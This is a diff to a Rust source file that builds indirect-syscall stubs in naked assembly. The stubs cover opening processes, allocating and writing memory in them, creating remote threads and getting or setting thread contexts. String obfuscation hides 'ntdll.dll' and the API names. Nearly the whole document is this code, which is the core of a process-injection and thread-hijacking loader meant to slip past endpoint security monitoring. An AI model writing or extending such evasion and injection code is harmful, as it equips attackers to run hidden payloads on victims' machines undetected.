@@ -1,68 +1,217 @@
-use winapi::shared::ntdef::HANDLE;
-use std::sync::OnceLock;
+use std::arch::naked_asm;
+use std::ffi::c_void;
+
+use ntapi::ntapi_base::CLIENT_ID;
+use winapi::um::winnt::{HANDLE, CONTEXT};
+use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 use obfuse::obfuse;
 use export_resolver::ExportList;
-use anyhow::{self, Ok};
-
-
-pub type NtOpenProcessFn = unsafe extern "system" fn(
-    ProcessHandle: *mut HANDLE,
-    DesiredAccess: u32,
-    ObjectAttributes: *const (),
-    ClientId: *const (),
-) -> i32;
-
-pub type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    BaseAddress: *mut *mut std::ffi::c_void,
-    ZeroBits: usize,
-    RegionSize: *mut usize,
-    AllocationType: u32,
-    Protect: u32,
-) -> i32;
-
-pub type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
-    ProcessHandle: HANDLE,
-    BaseAddress: *mut std::ffi::c_void,
-    Buffer: *const std::ffi::c_void,
-    NumberOfBytesToWrite: usize,
-    NumberOfBytesWritten: *mut usize,
-) -> i32;
-
-pub type NtCreateThreadExFn = unsafe extern "system" fn(
-    ThreadHandle: *mut HANDLE,
-    DesiredAccess: u32,
-    ObjectAttributes: *const (),
-    ProcessHandle: HANDLE,
-    StartAddress: *mut std::ffi::c_void,
-    Parameter: *mut std::ffi::c_void,
-    CreateSuspended: i32,
-    StackZeroBits: usize,
-    SizeOfStackCommit: usize,
-    SizeOfStackReserve: usize,
-    lpBytesBuffer: *mut std::ffi::c_void,
-) -> i32;
-
-
-pub type ZwGetContextThreadFn = unsafe extern "system" fn(
-    ThreadHandle: HANDLE,
-    ThreadContext: *mut CONTEXT,
-) -> i32;
-
-pub type ZwSetContextThreadFn = unsafe extern "system" fn(
-    ThreadHandle: HANDLE,
-    ThreadContext: *const CONTEXT,
-) -> i32;
+use anyhow::{self, Error, Ok};
 
 
 
 
-pub static NT_WRITE_VIRTUAL_MEMORY_ADDR: OnceLock<NtWriteVirtualMemoryFn> = OnceLock::new();
-pub static NT_OPEN_PROCESS_ADDR: OnceLock<NtOpenProcessFn> = OnceLock::new();
-pub static NT_CREATE_THREAD_EX_ADDR: OnceLock<NtCreateThreadExFn> = OnceLock::new();
-pub static NT_ALLOCATE_VIRTUAL_MEMORY_ADDR: OnceLock<NtAllocateVirtualMemoryFn> = OnceLock::new();
-pub static ZW_GET_CONTEXT_THREAD_ADDR: OnceLock<ZwGetContextThreadFn> = OnceLock::new();
-pub static ZW_SET_CONTEXT_THREAD_ADDR: OnceLock<ZwSetContextThreadFn> = OnceLock::new();
+
+
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_allocate_virtual_memory(process_handle: HANDLE, base_address: *mut *mut c_void, zero_bits: u64, region_size: *mut usize, allocation_type: u64, protect: u64, ssn: u32, syscall_ret: *mut u8) -> i32
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr[rsp+56]",
+        "jmp qword ptr[rsp+64]"
+    )
+}
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_open_process(process_handle: *mut HANDLE, desired_access: u32, object_attributes: *mut OBJECT_ATTRIBUTES, client_id: *mut CLIENT_ID, ssn: u32, syscall_ret: *mut u8) -> i32
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr[rsp+40]",
+        "jmp qword ptr[rsp+48]"
+    )
+
+}
+
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_create_thread_ex(thread_handle: *mut HANDLE, desired_access: u32, object_attributes: *mut OBJECT_ATTRIBUTES, process_handle: *mut HANDLE, start_roution: *mut c_void, argument: *mut c_void, create_flags: u64, zero_bits: usize, stack_size: usize, max_stack_size: usize, attribute_list: *mut c_void, ssn: u32, syscall_ret: *mut u8) -> i32
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr[rsp+96]",
+        "jmp qword ptr[rsp+104]"
+    )
+}
+
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_write_virtual_memory(process_handle: *mut HANDLE, base_address: *mut c_void, buffer: *mut c_void, number_of_bytes_to_write: usize, number_of_bytes_written: *mut usize, ssn: u32, syscall_ret: *mut u8)
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr[rsp+48]",
+        "jmp qword ptr[rsp+56]"
+    )
+
+}
+
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_get_context_thread(thread_handle: *mut HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8)
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, r8",
+        "jmp r9"
+    )
+
+}
+
+
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_set_context_thread(thread_handle: *mut HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8)
+{
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, r8",
+        "jmp r9"
+    )
+
+}
+
+
+#[repr(C)]
+#[derive(Copy, Clone, Debug)]
+pub struct NtSsn {
+    pub ssn: u32,
+    pub syscall_ret: *mut u8,
+}
+
+// 实现一个默认初始化，方便创建空数组
+impl Default for NtSsn {
+    fn default() -> Self {
+        Self {
+            ssn: 0,
+            syscall_ret: std::ptr::null_mut(),
+        }
+    }
+}
+
+#[repr(usize)]
+pub enum NtIndex {
+    ZwAllocateVirtualMemory = 0,
+    ZwProtectVirtualMemory = 1,
+    ZwFlushInstructionCache = 2,
+    ZwCreateSection = 3,
+    ZwMapViewOfSection = 4,
+    ZwUnmapViewOfSection = 5,
+    ZwQuerySystemInformation = 6,
+    ZwQueryObject = 7,
+    ZwQueryVirtualMemory = 8,
+    ZwFreeVirtualMemory = 9,
+    ZwSetContextThread = 10,
+    ZwGetContextThread = 11,
+    ZwWriteVirtualMemory = 12,
+    ZwCreateThreadEx = 13,
+    ZwOpenProcess = 14,
+}
+
+const NT_FUNCTION_COUNT: usize = 15;
+
+    // pub fn ZwProtectVirtualMemory(
+    //     ProcessHandle: HANDLE,
+    //     BaseAddress: *mut PVOID,
+    //     RegionSize: PSIZE_T,
+    //     NewProtect: ULONG,
+    //     OldProtect: PULONG,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwFlushInstructionCache(
+    //     ProcessHandle: HANDLE,
+    //     BaseAddress: PVOID,
+    //     NumberOfBytesToFlush: ULONG,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwCreateSection(
+    //     SectionHandle: PHANDLE,
+    //     DesiredAccess: ACCESS_MASK,
+    //     ObjectAttributes: POBJECT_ATTRIBUTES,
+    //     MaximumSize: PLARGE_INTEGER,
+    //     SectionPageProtection: ULONG,
+    //     AllocationAttributes: ULONG,
+    //     FileHandle: HANDLE,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwMapViewOfSection(
+    //     SectionHandle: HANDLE,
+    //     ProcessHandle: HANDLE,
+    //     BaseAddress: *mut PVOID,
+    //     ZeroBits: SIZE_T,
+    //     CommitSize: SIZE_T,
+    //     SectionOffset: PLARGE_INTEGER,
+    //     ViewSize: PSIZE_T,
+    //     InheritDisposition: SECTION_INHERIT,
+    //     AllocationType: ULONG,
+    //     Protect: ULONG,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwUnmapViewOfSection(
+    //     ProcessHandle: HANDLE,
+    //     BaseAddress: PVOID,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwQuerySystemInformation(
+    //     SystemInformationClass: ULONG,
+    //     SystemInformation: PVOID,
+    //     SystemInformationLength: ULONG,
+    //     ReturnLength: PULONG,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwQueryObject(
+    //     Handle: HANDLE,
+    //     ObjectInformationClass: ULONG,
+    //     ObjectInformation: PVOID,
+    //     ObjectInformationLength: ULONG,
+    //     ReturnLength: PULONG,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwQueryVirtualMemory(
+    //     ProcessHandle: HANDLE,
+    //     BaseAddress: PVOID,
+    //     MemoryInformationClass: MEMORY_INFORMATION_CLASS,
+    //     MemoryInformation: PVOID,
+    //     MemoryInformationLength: SIZE_T,
+    //     ReturnLength: PSIZE_T,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
+
+    // pub fn ZwFreeVirtualMemory(
+    //     ProcessHandle: HANDLE,
+    //     BaseAddress: *mut PVOID,
+    //     RegionSize: PSIZE_T,
+    //     FreeType: ULONG,
+    //     ssn: DWORD,
+    //     syscallret: PBYTE,
+    // ) -> NTSTATUS;
 
 
 macro_rules! set_nt_func {
@@ -80,7 +229,7 @@ macro_rules! set_nt_func {
 }
 
 
-pub fn init_nt_api() -> Result<()>{
+pub fn init_nt_api() -> Result<(), Error>{
     let obfused_ntdll = obfuse!("ntdll.dll\0");
     let ntdll_str = obfused_ntdll.as_str();
 
@@ -95,8 +244,8 @@ pub fn init_nt_api() -> Result<()>{
     let str_nt_allocate_virtual_memory = obfused_nt_allocate_virtual_memory.as_str();
     let str_nt_write_virtual_memory = obfused_nt_write_virtual_memory.as_str();
     let str_nt_create_thread_ex = obfused_nt_create_thread_ex.as_str();
-    let str_zw_get_context_thread = obfused_nt_get_context_thread.as_str();
-    let str_zw_set_context_thread = obfused_nt_set_context_thread.as_str();
+    let str_zw_get_context_thread = obfused_zw_get_context_thread.as_str();
+    let str_zw_set_context_thread = obfused_zw_set_context_thread.as_str();
 
 
     let mut exports = ExportList::new();
@@ -107,12 +256,7 @@ pub fn init_nt_api() -> Result<()>{
     exports.add(ntdll_str, str_zw_get_context_thread)?;
     exports.add(ntdll_str, str_zw_set_context_thread)?;
 
-    set_nt_func!(exports, str_nt_open_process, NT_OPEN_PROCESS_ADDR);
-    set_nt_func!(exports, str_nt_allocate_virtual_memory, NT_ALLOCATE_VIRTUAL_MEMORY_ADDR);
-    set_nt_func!(exports, str_nt_write_virtual_memory, NT_WRITE_VIRTUAL_MEMORY_ADDR);
-    set_nt_func!(exports, str_nt_create_thread_ex, NT_CREATE_THREAD_EX_ADDR);
-    set_nt_func!(exports, str_zw_get_context_thread, ZW_GET_CONTEXT_THREAD_ADDR);
-    set_nt_func!(exports, str_zw_set_context_thread, ZW_SET_CONTEXT_THREAD_ADDR);
+
 
 
     Ok(())
